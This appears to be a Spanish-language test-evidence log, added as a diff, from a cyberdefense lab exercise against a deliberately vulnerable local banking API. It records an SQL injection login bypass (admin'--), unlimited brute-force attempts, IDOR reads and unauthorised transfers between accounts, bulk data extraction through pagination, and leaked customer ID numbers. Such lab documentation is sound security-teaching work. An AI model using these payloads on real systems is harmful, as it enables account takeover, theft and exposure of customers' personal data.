@@ -1,0 +1,55 @@
+===================================================================
+ NeoQuetzal-lab  -  EVIDENCIA DE PRUEBAS (Fase 4 - Ciberdefensa)
+ Generado el: 2026-10-31 09:12
+ Objetivo: API vulnerable en http://localhost:3000
+===================================================================
+
+### PRUEBA 1 - Login legitimo (Juan Perez / cuenta 101)
+--- Peticion: POST /api/login {usuario:jperez, password:Pollo123}
+{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXN1YXJpbyI6ImpwZXJleiIsImlhdCI6MTc5MzQ1OTU3MiwiZXhwIjoxNzkzNTQ1OTcyfQ.Y8RxTz1JQWBWE0D1Q3h-S1lPVnuXRau_6j-fVgs4Ye0","nombre":"Juan Perez"}
+Token de Juan obtenido (lo usaremos para los ataques BOLA).
+
+### PRUEBA 2 - Inyeccion SQL en el login (CB-06, T-09)
+--- Se ingresa como usuario:  admin'--   sin saber la contrasena
+{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXN1YXJpbyI6ImFkbWluIiwiaWF0IjoxNzkzNDU5NTcyLCJleHAiOjE3OTM1NDU5NzJ9.SdiXC-So4MIuqVpT0vvbgYGRl47x1Zb2wQWRnnZ-56w","nombre":"Administrador"}
+>> Resultado: inicia sesion como Administrador SIN contrasena valida.
+
+### PRUEBA 3 - Fuerza bruta en login, sin bloqueo (CB-05, T-03, R-02)
+--- 8 intentos fallidos seguidos contra la cuenta jperez:
+   Intento 1 -> HTTP 401 (la cuenta NUNCA se bloquea)
+   Intento 2 -> HTTP 401 (la cuenta NUNCA se bloquea)
+   Intento 3 -> HTTP 401 (la cuenta NUNCA se bloquea)
+   Intento 4 -> HTTP 401 (la cuenta NUNCA se bloquea)
+   Intento 5 -> HTTP 401 (la cuenta NUNCA se bloquea)
+   Intento 6 -> HTTP 401 (la cuenta NUNCA se bloquea)
+   Intento 7 -> HTTP 401 (la cuenta NUNCA se bloquea)
+   Intento 8 -> HTTP 401 (la cuenta NUNCA se bloquea)
+
+### PRUEBA 4 - BOLA/IDOR: ver cuenta ajena (CB-04, T-06, R-01)
+--- Juan (dueno de la cuenta 101) consulta la cuenta 104 de Maria:
+{"id":104,"cliente_id":2,"numero":"GT-0001-0104","saldo":1200000}
+>> Resultado: obtiene el saldo de Q1,200,000 de otro cliente.
+
+### PRUEBA 5 - Exfiltracion masiva por paginacion (T-06 / caso de abuso)
+--- Juan pide los movimientos de la cuenta 104 con limit=999999:
+Movimientos extraidos de una cuenta ajena: 25
+
+### PRUEBA 6 - Transferencia desde una cuenta ajena (CB-04, T-07, R-01)
+--- Juan ordena debitar Q500000 de la cuenta 104 (de Maria) hacia la suya (101):
+{"ok":true,"mensaje":"Transferencia realizada"}
+>> Resultado: la transferencia se ejecuta sin verificar al dueno de la cuenta origen.
+
+### PRUEBA 7 - Fuga de datos de todos los clientes (control de rol ausente)
+Clientes expuestos (incluye DPI): 4
+   {'id': 1, 'usuario': 'jperez', 'nombre': 'Juan Perez', 'dpi': '2988112340101'}
+   {'id': 2, 'usuario': 'mlopez', 'nombre': 'Maria Lopez', 'dpi': '1874220550108'}
+   {'id': 3, 'usuario': 'crodas', 'nombre': 'Carlos Rodas', 'dpi': '3011998760114'}
+   {'id': 4, 'usuario': 'admin', 'nombre': 'Administrador', 'dpi': '0000000000000'}
+
+### PRUEBA 8 - Mensaje de error revela informacion interna (T-17)
+{"error":"near \"y\": syntax error","query":"SELECT * FROM clientes WHERE usuario = 'x'' AND password = 'y'"}
+>> Resultado: el error filtra la consulta SQL interna al atacante.
+
+===================================================================
+ FIN DE LA EVIDENCIA
+===================================================================
